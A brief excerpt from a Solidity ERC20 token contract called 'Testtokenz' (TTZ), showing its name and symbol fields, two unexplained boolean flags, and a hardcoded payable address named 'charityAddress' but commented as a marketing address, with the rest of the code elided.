...
contract Testtokenz is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Testtokenz";
    string public _symbol= "TTZ";
    bool balances1 = true;
    bool amount1 = true;

    address payable public charityAddress = payable(0x3D76452f22dC51CFEBfA0c5354756558b7433717); // Marketing Address
